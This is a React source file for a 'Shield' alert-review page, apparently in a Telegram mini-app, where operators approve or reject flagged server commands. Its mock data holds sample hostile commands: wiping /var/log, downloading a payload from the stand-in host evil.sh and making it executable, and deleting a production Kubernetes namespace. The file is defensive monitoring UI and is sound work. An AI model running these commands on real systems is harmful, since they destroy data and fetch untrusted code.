import { useState, useCallback } from 'react';
import { Alert } from '../types';
import AlertCard from '../components/AlertCard';
import BottomSheet from '../components/BottomSheet';
import RiskGauge from '../components/RiskGauge';
import { useHaptic } from '../hooks/useHaptic';
import { showToast } from '../tg';

const mockAlerts: Alert[] = [
  {
    id: '1', command: 'rm -rf /var/log/*', user: 'deploy', agentId: 'a1', agentHost: 'prod-web-02',
    riskScore: 85, threatLevel: 'critical', timestamp: new Date().toISOString(), status: 'pending',
    forensic: { fullCommand: 'sudo rm -rf /var/log/*', cwd: '/home/deploy', shell: '/bin/bash', parentProcess: 'sshd', networkConnections: ['10.0.1.5:22'] },
  },
  {
    id: '2', command: 'curl -sO http://evil.sh/payload.sh', user: 'guest', agentId: 'a3', agentHost: 'staging-01',
    riskScore: 72, threatLevel: 'high', timestamp: new Date(Date.now() - 300000).toISOString(), status: 'pending',
    forensic: { fullCommand: 'curl -sO http://evil.sh/payload.sh && chmod +x payload.sh', cwd: '/tmp', shell: '/bin/sh', parentProcess: 'sshd', networkConnections: ['10.0.2.10:22', '203.0.113.42:80'] },
  },
  {
    id: '3', command: 'kubectl delete namespace production', user: 'devops', agentId: 'a2', agentHost: 'prod-k8s-01',
    riskScore: 45, threatLevel: 'medium', timestamp: new Date(Date.now() - 600000).toISOString(), status: 'pending',
  },
];

export default function Shield() {
  const [alerts, setAlerts] = useState(mockAlerts);
  const [selected, setSelected] = useState<Alert | null>(null);
  const { success, error } = useHaptic();

  const pending = alerts.filter(a => a.status === 'pending');

  const handleApprove = useCallback((id: string) => {
    setAlerts(prev => prev.map(a => a.id === id ? { ...a, status: 'approved' as const } : a));
    showToast('Alert approved');
  }, []);

  const handleReject = useCallback((id: string) => {
    setAlerts(prev => prev.map(a => a.id === id ? { ...a, status: 'rejected' as const } : a));
    showToast('Alert rejected');
  }, []);

  return (
    <div className="px-4 pt-4">
      <h1 className="font-bold text-lg mb-1">Shield</h1>
      <p className="text-xs text-tg-hint mb-4">{pending.length} pending alert{pending.length !== 1 ? 's' : ''} — swipe to act</p>

      {pending.length === 0 ? (
        <div className="text-center py-12 text-tg-hint">
          <span className="text-4xl block mb-3">✨</span>
          <p className="text-sm">All clear! No pending alerts.</p>
        </div>
      ) : (
        pending.map(alert => (
          <AlertCard key={alert.id} alert={alert} onApprove={handleApprove} onReject={handleReject} onTap={setSelected} />
        ))
      )}

      <BottomSheet open={!!selected} onClose={() => setSelected(null)} title="Alert Details">
        {selected && (
          <div className="space-y-4">
            <div className="flex items-center gap-3">
              <RiskGauge score={selected.riskScore} size={64} />
              <div>
                <span className="text-xs text-tg-hint">Threat Level</span>
                <p className="font-semibold capitalize">{selected.threatLevel}</p>
              </div>
            </div>
            <div>
              <span className="text-xs text-tg-hint">Command</span>
              <code className="block mt-1 p-3 bg-tg-surface rounded-lg text-sm font-mono break-all">{selected.command}</code>
            </div>
            <div className="grid grid-cols-2 gap-3 text-sm">
              <div><span className="text-xs text-tg-hint">User</span><p>{selected.user}</p></div>
              <div><span className="text-xs text-tg-hint">Agent</span><p>{selected.agentHost}</p></div>
            </div>
            {selected.forensic && (
              <div>
                <span className="text-xs text-tg-hint font-semibold">Forensic Info</span>
                <div className="mt-2 space-y-1 text-sm">
                  <p><span className="text-tg-hint">CWD:</span> {selected.forensic.cwd}</p>
                  <p><span className="text-tg-hint">Shell:</span> {selected.forensic.shell}</p>
                  <p><span className="text-tg-hint">Parent:</span> {selected.forensic.parentProcess}</p>
                  {selected.forensic.networkConnections.length > 0 && (
                    <p><span className="text-tg-hint">Network:</span> {selected.forensic.networkConnections.join(', ')}</p>
                  )}
                </div>
              </div>
            )}
          </div>
        )}
      </BottomSheet>
    </div>
  );
}
